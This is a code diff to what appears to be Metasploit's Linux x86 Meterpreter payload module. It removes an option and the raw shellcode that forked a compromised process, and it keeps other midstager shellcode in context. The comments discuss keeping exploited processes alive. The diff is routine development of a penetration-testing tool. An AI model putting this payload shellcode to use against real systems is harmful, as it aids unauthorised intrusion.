@@ -24,7 +24,6 @@ module Metasploit3
       'Session'       => Msf::Sessions::Meterpreter_x86_Linux))
 
     register_options([
-      OptBool.new('PrependFork', [ false, "Add a fork() / exit_group() (for parent) code" ]),
       OptInt.new('DebugOptions', [ false, "Debugging options for POSIX meterpreter", 0 ])
     ], self.class)
   end
@@ -70,21 +69,6 @@ module Metasploit3
     # jumps to the entry point (the \x5a's)
 
     midstager = "\x81\xc4\x54\xf2\xff\xff" # fix up esp
-
-    if(datastore['PrependFork'])
-      # fork() / parent does exit()
-
-      # If the target process is threaded, this means the thread
-      # will exit. exit_group() will try to close the process down
-      # completely.. and if we do that, it may not be reaped
-      # correctly.
-      #
-      # Plus, depending on the vuln, we might get multiple shots at
-      # owning a finite amount of threads.
-
-      midstager <<
-      "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x06\x31\xc0\xb0\x01\xcd\x80"
-    end
 
     midstager <<
       "\x6a\x04\x5a\x89\xe1\x89\xfb\x6a\x03\x58" +
